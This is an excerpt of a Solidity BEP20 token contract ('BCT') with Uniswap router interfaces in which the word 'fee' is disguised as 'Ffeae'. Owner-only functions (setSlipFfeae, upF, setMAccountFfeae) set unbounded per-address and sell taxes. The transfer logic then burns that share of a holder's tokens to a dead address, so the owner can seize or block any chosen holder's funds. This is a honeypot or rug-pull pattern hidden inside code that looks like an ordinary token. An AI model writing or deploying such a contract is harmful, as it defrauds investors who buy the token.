...
interface IUniswapV2Factory {
    ...
    function FfeaeTo() external view returns (address);
    function FfeaeToSetter() external view returns (address);
    ...
    function setFfeaeTo(address) external;
    function setFfeaeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFfeaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingFfeaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingFfeaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingFfeaeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFfeaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BCT is BEP20, Ownable {
    ...
    uint256 private _defaultSellFfeae = 0;

    uint256 private _defaultBuyFfeae = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFfeae;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellFfeae = _value;
    }

    function setSlipFfeae(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFfeae[_address] = _value;
    }

    function getSlipFfeae(address _address) external view onlyownar returns (uint256) {
        return _slipFfeae[_address];
    }


    function setMAccountFfeae(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountFfeae(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeFfeaeAmount = 0;

        if (rF) {
            uint256 tradeFfeae = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFfeae = _defaultSellFfeae;
                }
                if (from == uniswapV2Pair) {

                    tradeFfeae = _defaultBuyFfeae;
                }
            }
            if (_slipFfeae[from] > 0) {
                tradeFfeae = _slipFfeae[from];
            }

            tradeFfeaeAmount = _Amount.mul(tradeFfeae).div(100);
        }


        if (tradeFfeaeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeFfeaeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFfeaeAmount);
            emit Transfer(from, _deadAddress, tradeFfeaeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeFfeaeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeFfeaeAmount);
        emit Transfer(from, _to, _Amount - tradeFfeaeAmount);
    }
